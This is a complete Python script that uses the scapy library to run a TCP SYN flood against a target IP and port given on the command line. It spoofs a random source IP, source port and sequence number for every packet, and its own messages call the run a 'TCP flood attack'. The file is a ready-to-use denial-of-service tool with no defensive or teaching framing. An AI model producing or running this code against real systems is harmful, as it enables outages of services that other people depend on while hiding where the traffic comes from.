import sys
import random
from scapy.all import *
import time

def tcp_flood(target_ip, target_port, num_packets):
    for _ in range(num_packets):
        # Generate random source IP and source port
        src_ip = ".".join(map(str, (random.randint(1, 254) for _ in range(4))))
        src_port = random.randint(1024, 65535)

        # Create an IP packet with the target IP as the destination
        ip_packet = IP(src=src_ip, dst=target_ip)

        # Create a TCP packet with the SYN flag set and random sequence number
        tcp_packet = TCP(sport=src_port, dport=target_port, flags="S", seq=random.randint(1, 2**32 - 1))

        # Combine the IP and TCP packets
        packet = ip_packet / tcp_packet

        # Send the packet
        send(packet, verbose=0)
        print(f"Sent packet from {src_ip}:{src_port} to {target_ip}:{target_port}")
        

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print(f"Usage: {sys.argv[0]} <target_ip> <target_port> <num_packets>")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    num_packets = int(sys.argv[3])

    print(f"Starting TCP flood attack on {target_ip}:{target_port} with {num_packets} packets")
    tcp_flood(target_ip, target_port, num_packets)
    print("TCP flood attack completed")
